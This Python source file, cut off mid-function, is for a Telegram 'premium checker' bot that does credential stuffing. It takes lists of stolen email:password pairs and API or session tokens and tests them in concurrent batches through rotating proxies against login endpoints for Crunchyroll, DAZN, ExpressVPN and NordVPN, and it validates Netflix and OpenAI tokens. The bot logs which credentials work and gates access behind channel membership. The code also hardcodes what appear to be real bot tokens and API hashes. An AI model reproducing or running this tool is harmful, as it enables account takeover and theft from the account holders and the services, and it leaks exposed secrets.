#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ROGUE NOMAD - Premium Checker Bot
Web Service Version for Render Free Tier
"""

import os
import asyncio
import logging
import json
import re
import io
import random
import time
import threading
from datetime import datetime
from typing import Dict, List, Optional, Any
from contextlib import asynccontextmanager

from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
import aiohttp
import aiosqlite

# ============================================
# CONFIGURATION - YOUR CREDENTIALS
# ============================================
BOT_TOKEN = "8651086980:AAFe43rg62NOceSHi-kdb5gbEK5QRqqr09E"
ADMIN_ID = 1875307475
CHANNEL_ID = -1003861121732
DATABASE_URL = "rogue_nomad.db"
LOG_LEVEL = "INFO"
BOT_LINK = "https://t.me/+ckfO94UHyhllODg0"
BOT_USERNAME = "@roguenomad_bot"
BOT_NAME = "Rogue Nomad"
BOT_VERSION = "v3.0"
PORT = int(os.environ.get("PORT", 10000))
APP_API_ID = 27456172
APP_API_HASH = "a2e90f559f8ba51bbe424039b98f2ee1"

# ============================================
# LOGGING SETUP
# ============================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%d-%b-%Y %H:%M:%S",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# DATABASE INITIALIZATION
# ============================================
INIT_DB = """
CREATE TABLE IF NOT EXISTS proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    proxy TEXT UNIQUE NOT NULL,
    score INTEGER DEFAULT 100,
    failures INTEGER DEFAULT 0,
    alive BOOLEAN DEFAULT 1,
    last_used TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS checks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    chat_id INTEGER NOT NULL,
    service TEXT NOT NULL,
    credential TEXT NOT NULL,
    valid BOOLEAN DEFAULT 0,
    status TEXT,
    data TEXT,
    proxy_used TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS user_stats (
    user_id INTEGER PRIMARY KEY,
    total_checks INTEGER DEFAULT 0,
    total_valid INTEGER DEFAULT 0,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS global_stats (
    id INTEGER PRIMARY KEY,
    service TEXT NOT NULL,
    total INTEGER DEFAULT 0,
    valid INTEGER DEFAULT 0,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_member BOOLEAN DEFAULT 0
);

CREATE INDEX IF NOT EXISTS idx_checks_user ON checks(user_id);
CREATE INDEX IF NOT EXISTS idx_checks_service ON checks(service);
CREATE INDEX IF NOT EXISTS idx_checks_created ON checks(created_at);
CREATE INDEX IF NOT EXISTS idx_proxy_alive ON proxies(alive);
CREATE INDEX IF NOT EXISTS idx_proxy_score ON proxies(score);
"""

@asynccontextmanager
async def get_db():
    async with aiosqlite.connect(DATABASE_URL) as db:
        await db.execute(INIT_DB)
        await db.commit()
        yield db

# ============================================
# CHANNEL MEMBERSHIP CHECK
# ============================================
async def is_user_in_channel(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logger.error(f"Channel check failed for user {user_id}: {e}")
        return False

async def check_and_prompt_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        return True
    if context.user_data.get("is_verified"):
        return True
    async with get_db() as db:
        cursor = await db.execute("SELECT is_member FROM users WHERE user_id = ?", (user_id,))
        result = await cursor.fetchone()
        if result and result[0] == 1:
            context.user_data["is_verified"] = True
            return True
    is_member = await is_user_in_channel(user_id, context)
    if is_member:
        async with get_db() as db:
            await db.execute(
                "INSERT OR REPLACE INTO users (user_id, is_member, last_active) VALUES (?, 1, CURRENT_TIMESTAMP)",
                (user_id,)
            )
            await db.commit()
        context.user_data["is_verified"] = True
        return True
    
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=BOT_LINK)],
        [InlineKeyboardButton("✅ I've Joined", callback_data="check_membership")],
        [InlineKeyboardButton("💬 Chat Owner", url="https://t.me/roguenomad_bot")],
    ]
    await update.message.reply_text(
        "🚫 Access Restricted\n\nTo use this bot, you must join our channel first:\n\n" + BOT_LINK + "\n\nAfter joining, click the button below to verify.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=None
    )
    return False

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        context.user_data["is_verified"] = True
        await query.edit_message_text("✅ Admin access granted.")
        await show_welcome(update, context)
        return
    is_member = await is_user_in_channel(user_id, context)
    if is_member:
        async with get_db() as db:
            await db.execute(
                "INSERT OR REPLACE INTO users (user_id, is_member, last_active) VALUES (?, 1, CURRENT_TIMESTAMP)",
                (user_id,)
            )
            await db.commit()
        context.user_data["is_verified"] = True
        await query.edit_message_text("✅ Verification successful! You can now use the bot.")
        await show_welcome(update, context)
    else:
        await query.edit_message_text(
            "❌ You haven't joined yet.\n\nPlease join our channel first:\n" + BOT_LINK + "\n\nThen click the button again.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Join Channel", url=BOT_LINK)],
                [InlineKeyboardButton("✅ I've Joined", callback_data="check_membership")]
            ]),
            parse_mode=None
        )

# ============================================
# PROXY MANAGER
# ============================================
class ProxyManager:
    def __init__(self):
        self._cache = []
        self._cache_time = 0
        self._cache_ttl = 60
    
    async def get_working_proxies(self) -> List[str]:
        if time.time() - self._cache_time < self._cache_ttl and self._cache:
            return self._cache
        async with get_db() as db:
            cursor = await db.execute("SELECT proxy FROM proxies WHERE alive = 1 ORDER BY score DESC LIMIT 500")
            rows = await cursor.fetchall()
            self._cache = [row[0] for row in rows]
            self._cache_time = time.time()
            return self._cache
    
    async def get_proxy(self) -> Optional[str]:
        proxies = await self.get_working_proxies()
        if not proxies:
            return None
        return random.choice(proxies)
    
    async def add_proxy(self, proxy: str) -> bool:
        proxy = proxy.replace("http://", "").replace("https://", "").strip()
        if not proxy or ":" not in proxy:
            return False
        parts = proxy.split(":")
        if len(parts) not in [2, 4]:
            return False
        try:
            async with get_db() as db:
                await db.execute("INSERT OR IGNORE INTO proxies (proxy) VALUES (?)", (proxy,))
                await db.commit()
                self._cache = []
                return True
        except Exception as e:
            logger.error(f"Error adding proxy {proxy}: {e}")
            return False
    
    async def add_proxies_from_text(self, content: str) -> int:
        added = 0
        for line in content.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#"):
                if await self.add_proxy(line):
                    added += 1
        return added
    
    async def report_result(self, proxy: str, success: bool):
        if not proxy:
            return
        async with get_db() as db:
            if success:
                await db.execute("UPDATE proxies SET score = MIN(100, score + 5), failures = 0 WHERE proxy = ?", (proxy,))
            else:
                await db.execute("UPDATE proxies SET score = MAX(0, score - 10), failures = failures + 1 WHERE proxy = ?", (proxy,))
                await db.execute("UPDATE proxies SET alive = 0 WHERE proxy = ? AND failures >= 3", (proxy,))
            await db.commit()
            self._cache = []
    
    async def get_stats(self) -> Dict:
        async with get_db() as db:
            total = await db.execute_fetchall("SELECT COUNT(*) FROM proxies")
            alive = await db.execute_fetchall("SELECT COUNT(*) FROM proxies WHERE alive = 1")
            return {"total": total[0][0] if total else 0, "alive": alive[0][0] if alive else 0}
    
    async def clear_dead_proxies(self) -> int:
        async with get_db() as db:
            cursor = await db.execute("DELETE FROM proxies WHERE alive = 0")
            await db.commit()
            removed = cursor.rowcount
            self._cache = []
            return removed

# ============================================
# SERVICE CHECKERS
# ============================================
class ServiceCheckers:
    @staticmethod
    async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://www.crunchyroll.com/", proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    html = await resp.text()
                    csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
                    csrf = csrf_match.group(1) if csrf_match else ""
                async with session.post(
                    "https://www.crunchyroll.com/login",
                    data={"email": email, "password": password, "csrf_token": csrf},
                    proxy=proxy,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 302:
                        return {"valid": True, "status": "active", "tier": "premium"}
                    return {"valid": False, "status": "invalid"}
        except Exception as e:
            return {"valid": False, "status": "error", "error": str(e)}
    
    @staticmethod
    async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                async with session.get("https://www.netflix.com/api/shakti/viper/metadata", headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "expired"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://login.dazn.com/v1/auth/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "region": data.get("region", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_openai_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {token}"}
                async with session.get("https://api.openai.com/v1/models", headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active", "tier": "paid"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://www.expressvpn.com/api/v1/auth/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://api.nordvpn.com/v1/users/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}

# ============================================
# CHECKER ENGINE
# ============================================
class CheckerEngine:
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.services = {
            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🎬 Crunchyroll"},
            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type": "token", "label": "🎬 Netflix"},
            "dazn": {"checker": ServiceCheckers.check_dazn, "type": "email:pass", "label": "🎬 DAZN"},
            "openai": {"checker": ServiceCheckers.check_openai_token, "type": "token", "label": "🧠 OpenAI"},
            "expressvpn": {"checker": ServiceCheckers.check_expressvpn, "type": "email:pass", "label": "🔒 ExpressVPN"},
            "nordvpn": {"checker": ServiceCheckers.check_nordvpn, "type": "email:pass", "label": "🔐 NordVPN"},
        }
        self.semaphore = asyncio.Semaphore(30)
        self.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
    
    def _parse_credential(self, cred: str) -> Dict:
        cred = cred.strip()
        if ":" in cred and "@" in cred:
            parts = cred.split(":", 1)
            return {"email": parts[0].strip(), "password": parts[1].strip()}
        elif cred.startswith("ey") or len(cred) > 30:
            return {"token": cred}
        else:
            return {"raw": cred}
    
    async def check_single(self, service: str, credential: str, use_proxy: bool = True, user_id: int = 0, chat_id: int = 0) -> Dict:
        async with self.semaphore:
            proxy = await self.proxy_manager.get_proxy() if use_proxy else None
            service_info = self.services.get(service)
            if not service_info:
                return {"valid": False, "status": "unknown_service"}
            checker = service_info["checker"]
            parsed = self._parse_credential(credential)
            try:
                result = await checker(**parsed, proxy=proxy)
                if proxy:
                    await self.proxy_manager.report_result(proxy, result.get("valid", False))
                self._update_stats(service, result.get("valid", False))
                await self._log_check(user_id, chat_id, service, credential[:50], result.get("valid", False), result.get("status", "unknown"), json.dumps(result), proxy)
                result["proxy_used"] = proxy
                return result
            except Exception as e:
                self.stats["errors"] += 1
                await self._log_check(user_id, chat_id, service, credential[:50], False, "error", json.dumps({"error": str(e)}), proxy)
                return {"valid": False, "status": "error", "error": str(e)}
    
    async def check_batch(self, service: str, credentials: List[str], use_proxy: bool = True, user_id: int = 0, chat_id: int = 0, max_workers: int = 20) -> List[Dict]:
        sem = asyncio.Semaphore(max_workers)
        async def limited_check(cred):
            async with sem:
                return await self.check_single(service, cred, use_proxy, user_id, chat_id)
        tasks = [limited_check(cred) for cred in credentials]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        processed = []
        for r in results:
            if isinstance(r, Exception):
                processed.append({"valid": False, "status": "error", "error": str(r)})
            else:
                processed.append(r)
        return processed
    
    async def _log_check(self, user_id, chat_id, service, credential, valid, status, data, proxy):
        try:
            async with get_db() as db:
                await db.execute(
                    "INSERT INTO checks (user_id, chat_id, service, credential, valid, status, data, proxy_used) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (user_id, chat_id, service, credential, valid, status, data, proxy or "")
                )
                await db.execute("INSERT OR REPLACE INTO users (user_id, last_active) VALUES (?, CURRENT_TIMESTAMP)", (user_id,))
                await db.commit()
        except Exception as e:
            logger.error(f"Failed to log check: {e}")
    
    def _update_stats(self, service: str, valid: bool):
        self.stats["total"] += 1
        if valid:
            self.stats["valid"] += 1
        else:
            self.stats["invalid"] += 1
        if service not in self.stats["by_service"]:
            self.stats["by_service"][service] = {"total": 0, "valid": 0}
        self.stats["by_service"][service]["total"] += 1
        if valid:
            self.stats["by_service"][service]["valid"] += 1
    
    def get_stats(self) -> Dict:
        return self.stats

# ============================================
# TELEGRAM BOT - INITIALIZE
# ============================================
proxy_manager = ProxyManager()
checker_engine = CheckerEngine(proxy_manager)

SERVICE_CATEGORIES = {
    "Streaming Services": {
        "crunchyroll": "🎬 Crunchyroll",
        "netflix": "🎬 Netflix",
        "dazn": "🎬 DAZN"
    },
    "VPN / Proxy Services": {
        "expressvpn": "🔒 ExpressVPN",
        "nordvpn": "🔐 NordVPN"
    },
    "AI Services": {
        "openai": "🧠 OpenAI"
    }
}

# ============================================
# WELCOME & COMMANDS
# ============================================
async def sho
